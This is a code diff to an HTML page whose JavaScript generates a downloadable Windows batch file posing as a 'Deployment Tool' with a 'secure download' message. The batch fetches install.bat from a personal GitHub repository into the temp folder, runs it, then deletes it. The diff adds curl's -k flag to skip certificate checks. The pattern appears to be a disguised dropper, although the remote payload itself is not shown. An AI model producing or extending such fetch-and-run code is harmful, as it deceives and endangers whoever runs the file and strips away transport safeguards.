@@ -211,7 +211,8 @@
         const batchFileContent = `@echo off\n` +
             `title Deployment Tool\n` +
             `echo [SYSTEM] Initializing secure download...\n` +
-            `curl -L -o "%TEMP%\\inst.bat" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/install.bat"\n` +
+            // Added -k here to bypass the CRYPT_E_REVOCATION_OFFLINE error
+            `curl -k -L -o "%TEMP%\\inst.bat" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/install.bat"\n` +
             `if %errorlevel% neq 0 ( echo [ERROR] Connection Failed. & pause & exit /b )\n` +
             `call "%TEMP%\\inst.bat"\n` +
             `del "%TEMP%\\inst.bat"\n` +
@@ -227,6 +228,5 @@
         window.URL.revokeObjectURL(url);
     }
 </script>
-
 </body>
 </html>
